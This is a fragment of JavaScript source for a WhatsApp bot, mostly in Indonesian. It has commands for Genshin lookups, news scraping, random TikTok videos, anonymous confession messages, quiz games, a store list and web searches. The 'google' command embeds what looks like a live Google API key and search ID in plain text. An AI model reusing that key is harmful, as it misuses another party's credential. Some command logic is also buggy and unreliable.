        let available = await genshindb.artifacts("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Artefak yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-area':
    case 'g-area':
    case 'gens-area': {
      
      if (!text) return m.reply(`Example: *${prefix + command} liyue*\nPlease provide nama tempat.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Info Geografi: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data not available"}\n`;
          response += `*Region:* ${result.region || "Data not available"}\n`;
          response += `*Urutan Sortir:* ${result.sortorder || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Geografi not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Geografi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-animal':
    case 'g-animals':
    case 'gens-animals': {
      
      if (!text) return m.reply(`Example: *${prefix + command} shiba*\nPlease provide nama hewan.`);
      try {
        let animal = await genshindb.animals(text);
        if (animal) {
          let response = `*Hewan Ditemukan: ${animal.name}*\n\n`;
          response += `"${animal.description}"\n\n`;
          response += `*Kategori:* ${animal.category || ""}\n`;
          response += `*Jenis Hitungan:* ${animal.counttype || ""}\n`;
          response += `_${animal.sortorder ? `Urutan Sortir: ${animal.sortorder}` : ""}_`;
          m.reply(response);
        } else {
          m.reply("Hewan not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        try {
          let animalCategories = await genshindb.animals(text, {
            matchCategories: true
          });
          m.reply(`*Kategori Hewan ${text} :*\n\n- ${animalCategories.join("\n- ")}`);
        } catch (err) {
          m.reply('An error occurred...')
          let allAnimalNames = await genshindb.animals("names", {
            matchCategories: true
          });
          m.reply(`*Tidak Ditemukan*\n\n*Hewan yang tersedia:* ${allAnimalNames.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-rankaddventure':
    case 'g-rankaddventure':
    case 'genshin-advrank':
    case 'g-advrank':
    case 'gens-rankaddventure':
    case 'gens-advrank': {
      
      if (!text || isNaN(parseInt(text))) {
        return m.reply(`Enter nomor peringkat petualang yang valid. Example: *${prefix + command} 5*`);
      }
      try {
        let rankNumber = parseInt(text);
        let result = await genshindb.adventureranks(rankNumber);
        if (result) {
          let response = `*Rank Petualang Ditemukan untuk Rank ${rankNumber}:*\n\n`;
          response += `*Experience:* ${result.exp || "Data not available"}\n`;
          response += `*Reward:* ${result.reward || "Data not available"}\n`;
          response += `*Description:* ${result.description || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply(`Rank petualang untuk Rank ${rankNumber} not found.`);
        }
      } catch (err) {
        m.reply('An error occurred...')
        let availableRanks = await genshindb.adventureranks("names");
        m.reply(`*Tidak Ditemukan*\n\n*Rank petualang yang tersedia:* ${availableRanks.join(", ")}`);
      }
    };
    break

    case 'genshin-achievement':
    case 'g-achievement':
    case 'gens-achievement': {
      
      if (!text) return m.reply(`Example: *${prefix + command} mondstadt*\nPlease provide nama prestasi.`);
      try {
        let result = await genshindb.achievements(text);
        if (result) {
          let response = `*${result.name}*\n`;
          response += `_${result.description}_\n\n`;
          response += `*Kategori:* ${result.category || ""}\n`;
          response += `*Rarity:* ${result.rarity || ""}\n`;
          response += `*Detail:* ${result.detail || ""}\n`;
          response += `*Cara Mendapatkan:* ${result.howToObtain || ""}\n`;
          m.reply(response);
        } else {
          m.reply("Prestasi not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.achievements("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Prestasi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-char':
    case 'g-char':
    case 'gens-char':
    case 'genshin-characters':
    case 'g-characters':
    case 'gens-characters': {
      
      if (!text) return m.reply(`Example: *${prefix + command} diluc*\nPlease provide nama karakter.`);
      try {
        let result = await genshindb.characters(text);
        if (result) {
          let response = `*Character Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Vision:* ${result.vision || "Data not available"}\n`;
          response += `*Senjata:* ${result.weapon || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Character not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.characters("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Character yang tersedia:* ${available.join(", ")}`);
      }
    };
    break
    
    //============ Berita
    case 'fajar':{
FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
}
break

case 'cnn': {
CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
}
break

case 'layarkaca': {
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
}
break

case 'cnbc': {
    try {
        CNBCNews().then(async (res) => {
            let no = 0;
            let iwannnn = "";
            for (let i of res) {
                no += 1;
                iwannnn += `\n• ${no.toString()} •\n`;
                iwannnn += `Berita: ${i.berita}\n`;
                iwannnn += `Upload: ${i.berita_diupload}\n`;
                iwannnn += `Link: ${i.berita_url}\n`;
            }
            iwannnn += "";

            const thumb = res[0]?.berita_thumb || ''; // Pastikan 'berita_thumb' tidak undefined
            await Hisoka.sendMessage(m.chat, { 
                image: { url: thumb }, 
                caption: iwannnn 
            }, { quoted: m });
        }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break;

case 'secondsnews': {
  try {
DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
Hisoka.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break


case 'inews': {
iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
}
break

case 'okezone': {
  try {
OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Hisoka.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break

case 'sindo':{
SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
}
break


case 'antara':{
  try {
AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Hisoka.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break

case 'merdeka': {
  try {
MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Hisoka.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break

case 'jalantikus': {
var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
Hisoka.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
}
break

// Random Video
case 'girl':
case 'tiktokgirl':
if (!isOwner && !isPremium) return reply(mess.owner)
Hisoka.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'ghea':
case 'tiktokghea':
  if (!isOwner && !isPremium) return reply(mess.owner)
var gheayubi = JSON.parse(fs.readFileSync('./lib/tiktok/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'bocil':
case 'tiktokbocil':
  if (!isOwner && !isPremium) return reply(mess.owner)
var bocil = JSON.parse(fs.readFileSync('./lib/tiktok/bocil.json'))
var hasil = pickRandom(bocil)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'nukhty':
case 'tiktoknukhty':
  if (!isOwner && !isPremium) return reply(mess.owner)
var ukhty = JSON.parse(fs.readFileSync('./lib/tiktok/ukhty.json'))
var hasil = pickRandom(ukhty)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'santuy':
case 'tiktoksantuy':
  if (!isOwner && !isPremium) return reply(mess.owner)
var santuy = JSON.parse(fs.readFileSync('./lib/tiktok/santuy.json'))
var hasil = pickRandom(santuy)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'kayes':
case 'tiktokkayes':
  if (!isOwner && !isPremium) return reply(mess.owner)
var kayes = JSON.parse(fs.readFileSync('./lib/tiktok/kayes.json'))
var hasil = pickRandom(kayes)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'panrika':
case 'tiktokpanrika':
  if (!isOwner && !isPremium) return reply(mess.owner)
var rikagusriani = JSON.parse(fs.readFileSync('./lib/tiktok/panrika.json'))
var hasil = pickRandom(rikagusriani)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break
case 'notnot':
case 'tiktoknotnot':
  if (!isOwner && !isPremium) return reply(mess.owner)
var notnot = JSON.parse(fs.readFileSync('./lib/tiktok/notnot.json'))
var hasil = pickRandom(notnot)
Hisoka.sendMessage(m.chat, { caption: foother, video: { url: hasil.url }}, { quoted: m })
break

    
    // menfess
case"confes": case "menfes":case 'menfess': case 'confess': {
if (!isPrivate) return reply(`Private chat only!!`)
      global.menfess = global.menfess ? global.menfess : {}
      if (!text) return reply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let [jid, name, msg] = text.split`|`
      if ((!jid || !name || !msg)) return reply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let p = (await Hisoka.onWhatsApp(jid))[0] || {}
      if (!p.exists) return reply('❌ The number you entered is incorrect')
      if (p.jid == m.sender) return reply('Itu Nomer Lu Dodol!!')
      let mf = Object.values(global.menfess).find(mf => mf.status === true)
      if (mf) return !0
         let heri = `${monospa(`${name.trim()}`)}`
         let id = +new Date
         let txt = `📨 Hey, you got a message from someone 👋 \n\nname: *${name.trim()}*\n\nMessage: `
         txt += `_${msg.trim()}_\n\n${readmore}Want to reply to this message? Just type your message and send it, I'll deliver it to ${heri}`
         
             await Hisoka.sendMessage(p.jid, {
    text: txt,
    contextInfo: {
      externalAdReply: {
        title: 'Confess',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/5413eed27c6af00fa7273.jpg',
        sourceUrl: `${ch}`,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }).then(() => {
 m.reply(`*Successfully Sent Confession Message!!*`)       
            global.menfess[id] = {
               id,
               from: m.sender,
               name,
               receiver: p.jid,
               msg,
               status: false
            }
            return !0
         })
   }
break 

// Game
   
               case 'guessword': case 'tebakkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkata.json')));
console.log('Answer : '+jawaban)
await reply(`*WORD GUESSING GAME*\n\nQuestion: ${soal}\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nTime: ${gamewaktu} seconds`)
tebakkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakkata) reply(`Time's up!\n\nAnswer to the question:\n${monospace(soal)}\n\nIs: ${monospace(jawaban)}`);
delete tebakkata
}, gamewaktu * 1000)
}
break 
case 'brainteaser': case 'asahotak': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/asahotak.json')));
console.log('Answer : '+jawaban)
await reply(`*BRAIN TEASER GAME*\n\nQuestion: ${soal}\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nTime: ${gamewaktu} seconds`)
asahotak = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Time's up!\n\nAnswer to the question:\n${monospace(soal)}\n\nIs: ${monospace(jawaban)}`);
delete asahotak
}, gamewaktu * 1000)
}
break           
case 'arrangeword': case 'susunkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/susunkata.json')));
console.log('Answer : '+jawaban)
await reply(`*WORD ARRANGEMENT GAME*\n\nQuestion: ${soal}\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nTime: ${gamewaktu} seconds`)
susunkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Time's up!\n\nAnswer to the question:\n${monospace(soal)}\n\nIs: ${monospace(jawaban)}`);
delete susunkata
}, gamewaktu * 1000)
}
break           
case 'guesspicture': case 'tebakgambar':
if (!isGroup) return reply(mess.group)
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakgambar.json')));
console.log('Answer : '+jawaban)
var teks1 = `*PICTURE GUESSING GAME*\n\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDescription: ${deskripsi}\nTime: ${gamewaktu} seconds`
await Hisoka.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar) reply(`Time's up!\nThe answer is: ${tebakgambar2[from].jawaban}`);
delete tebakgambar
}, gamewaktu * 1000)
}
break
case 'guessflag': case 'tebakbendera': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakbendera.json')));
console.log('Answer : '+jawaban)
await reply(`*FLAG GUESSING GAME*\n\nQuestion: ${soal}\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nTime: ${gamewaktu} seconds`)
tebakbendera = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Time's up!\n\nAnswer to the question:\n${monospace(soal)}\n\nIs: ${monospace(jawaban)}`);
delete tebakbendera
}, gamewaktu * 1000)
}
break
case 'guesschemistry': case 'tebakkimia': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkimia.json')));
console.log('Answer : '+jawaban)
await reply(`*BRAIN TEASER GAME*\n\nQuestion: ${soal}\nHint: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nTime: ${gamewaktu} seconds`)
tebakkimia = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Time's up!\n\nAnswer to the question:\n${monospace(soal)}\n\nIs: ${monospace(jawaban)}`);
delete tebakkimia
}, gamewaktu * 1000)
}
break        
case 'family': case 'family100': case 'f100': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/family100.json')));
console.log('Answer : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply(`*FAMILY 100 GAME*\n\nQuestion: ${soal}\nTotal Answers: ${jawaban.length}\n\nTime: ${gamewaktu} seconds`)
family = {
soal: soal,
jawaban: famil,
waktu: setTimeout(async function () {
if (global.family) {
let teks = `*WAKTU HABIS!*\nAnswer yang belum terjawab :\n\n`
let jwb = family.jawaban
for (let i of jwb){teks += `\n${i}`}
reply(teks)
delete family
};
}, gamewaktu * 1000)
}

break   

// Store
case "idch":
case "cekidch": {
if (!text) return m.reply("channel link")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Hisoka.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
m.reply(teks)
}
                        break;
case 'upch': {
  if (!text) return m.reply(`Example: ${command} Hai`)
  let teks = `\n${text}\n`

  // Bot Owner ID (can be more than one)
  const ownerJid = [`${idch}`] // replace with owner number

  for (let id of ownerJid) {
    await Hisoka.sendMessage(id, {
      text: teks,
      mentions: [m.sender]
    }, { quoted: m })
  }

  m.reply('Successfully sent message')
}
break
case 'sendgc': {
  if (!text) return m.reply(`Example: ${command} Hai`)

  // Bot Owner ID (can be more than one)
  const ownerJid = [`${idgc}`] // replace with owner number

  for (let id of ownerJid) {
    Hisoka.sendMessage(id, {image: {url: thumbnail }, caption: text, mentions: [m.sender] }, {quoted: m})
}

  m.reply('Successfully sent message')
}
break
case "proses": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply("jasa install panel")
let teks = `\n📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${ch}\n`
await Hisoka.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Payment Received ✅`, 
body: `© Powered By ${namaowner}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
sourceUrl: ch,
}}}, {quoted: null})
}
break
case "done": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply("jasa install panel")
let teks = `\n📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${ch}
\n`
await Hisoka.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaowner}`, 
thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`, 
sourceUrl: ch,
}}}, {quoted: null})
}
break
case 'lits': case 'list': case 'store':{
if (db_respon_list.length === 0) return reply(`No list messages in database yet`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`No list messages registered in this group yet`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toLowerCase()}\n`
}
}
teks += `\n\nTo view product details, please send the product name from the list above. For example, if you want to see product details from ${db_respon_list[0].key.toLowerCase()}, then send the message ${db_respon_list[0].key.toLowerCase()} to the bot`
Hisoka.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break

case 'dellist':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (db_respon_list.length === 0) return reply(`No list messages in database yet`)
if (!text) return reply(`Use with method ${prefix + command} *key*\n\n_Example_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`Response list with key *${q}* not found in database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Successfully deleted list message with key *${q}*`)
break
case 'addlist':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Use with method ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`Response list with key : *${args1}* already exists in this group.`)
if (/image/.test(mime)) {
let media = await Hisoka.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
addResponList(m.chat, args1, args2, true, mem, db_respon_list)
reply(`Successfully set list message with key: *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Successfully set list message with key: *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
let args3 = q.split("|")[0].toLowerCase()
let args4 = q.split("|")[1]
if (!q.includes("|")) return reply(`Use with method ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Sorry, key *${args3}* is not registered in this group`)
if (/image/.test(mime)) {
let media = await Hisoka.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
updateResponList(m.chat, args3, args4, true, mem, db_respon_list)
reply(`Successfully updated response list with key *${args3}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(m.chat, args3, args4, false, '-', db_respon_list)
reply(`Successfully updated response list with key *${args3}*`)
}
break
case 'pay': case 'payment': {
if (!isPrivate) return reply(mess.private)

await Hisoka.sendMessage(m.chat, {image: {url: qris }, caption: `dana : ${dana}\ngopay : ${gopay}`  }, {quoted: m})
}
break

// Search
case 'animesearch': {
 if (!text) return m.reply(`Example penggunaan: .${prefix}solo leveling`)
    
    try {
        // Show loading indicator
        await m.reply('🔍 Mencari anime...')
        
        // Make API request
        const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`
        const { data } = await axios.get(apiUrl)
        
        if (!data.status || !data.result || data.result.length === 0) {
            return m.reply('No results found for that anime.')
        }
        
        // Format the results
        let replyText = `🎌 *Hasil Pencarian Anime* 🎌\n\n`
        data.result.forEach((anime, index) => {
            replyText += `*${index + 1}. ${anime.title}*\n`
            replyText += `├ Tipe: ${anime.type || 'Tidak diketahui'}\n`
            replyText += `├ Status: ${anime.status || 'Tidak diketahui'}\n`
            replyText += `└ Link: ${anime.link}\n\n`
        })
        
        // Send first result with image
        const firstResult = data.result[0]
        await Hisoka.sendMessage(m.chat, {
            image: { url: firstResult.image },
            caption: replyText
        }, { quoted: m })
        
    } catch (error) {
        console.error('Error searching anime:', error)
        m.reply('Failed to search anime. Please try again later.')
    }
}
break
case 'playstore':
    case 'pstore': {
      if (!text) return m.reply(`Example: ${command} whatsapp`);
      try {
        let loo = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${text}`);
        let results = loo.result;

        if (!results.length) return m.reply('No results found.');
        let gambar = results[0]?.img;
        let teks = results.map((yoo, i) => {
          return `*${i + 1}. ${text.toUpperCase()}*
Developer: ${yoo.developer}
Rating: ${yoo.rate2}
Link: ${yoo.link}
Link Developer: ${yoo.link_dev}`;
        }).join('\n\n');
        await Hisoka.sendMessage(m.chat, {
          image: {
            url: gambar
          },
          caption: teks
        }, {
          quoted: m
        });
      } catch (err) {
        console.error(err);
        m.reply(err.toString());
      }
    }
    break

    case 'playstation':
    case 'pstation': {
      if (!text) return m.reply(`Example: ${command} Naruto`);
      try {
        let loo = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${text}`);
        let gambar = loo.result.images;
        let teks = loo.result.map((yoo, i) => {
          return `*${i + 1}. ${yoo.title.toUpperCase()}*
Link: ${yoo.link}`;
        }).join('\n\n');
        await Hisoka.sendMessage(m.chat, {
          image: {
            url: gambar
          },
          caption: teks
        }, {
          quoted: m
        });
      } catch (err) {
        console.error(err);
        m.reply(err.toString());
      }
    }
    break

    case 'google': {
      if (!text) return m.reply(`Example: ${command} Hisoka`)
      const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk'
      const cx = 'e5c2be9c3f94c4bbb'
      const query = (text)
      const url = `https://www.googleapis.com/customsearch/v1?q=${query}&key=${apiKey}&cx=${cx}`
      fetch(url).then(response => response.json()).then(data => {
        if (data.items && data.items.length > 0) {
          let teks = `Google search results: ${text}\n\n`
          data.items.forEach(item => {
            teks += `• Judul: ${item.title}\n`
            teks += `• Description: ${item.snippet}\n`
            teks += `• Link: ${item.link}\n\n`
          })
          m.reply(teks)
        } else {
          m.reply('No results found')
        }
      }).catch(err => {
        m.reply('An error occurred')
      })
    }
    break
    case 'yts': case 'ytsearch': {
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
HisokaReact()
 let [l, r] = text.split`|`
 if (!l) l = ''
 if (!r) r = ''
 const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 let redmo = l + readMore + r
 let anu = (await yts(text)).all
 let video = anu.filter(v => v.type === 'video') 
let channel = anu.filter(v => v.type === 'channel') 
let teks = `*${monospa('Hasil Pencarian YouTube 👇')}*\n${redmo}${channel.map(v => `*${v.name}* (${v.url})\n_${v.subCountLabel} (${v.subCount}) Subscriber_\n${v.videoCount} video\n========================`.trim()

).join("\n")}`+`${video.map(v => `*${v.title}* (${v.url})\nDuration: ${v.timestamp}\nUploaded ${v.ago}
\n${v.views} views\n========================`.trim() ).join("\n")}`
let image = channel.length ? channel[0].image : video.length ? video[0].image : urlmenu.main

let sections = [{
                title: global.namebot2, 
                highlight_label: 'start chats', 
                rows: [{
                        header: global.namebot2, 
        title: "Menu",
        description: `kembali ke menu !`, 
        id: '.menu'
        },
        {
                header: global.namebot2, 
                title: "Owner Bot", 
                description: "Owner bot, pemilik bot", 
                id: '.owner'
        }]
}]

video.forEach(async(data) => {
sections.push({
        title: data.title, 
        rows: [{
                title: "Get Video", 
                description: `Get video from "${data.title}"`, 
                id: `.ytmp4 ${data.url}`
                }, 
                {
                title: "Get Audio", 
                description: `Get audio from "${data.title}"`, 
                id: `.ytmp3 ${data.url}`
                }]
        }) 
}) 
let listMessage = {
    title: 'Download Media!!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
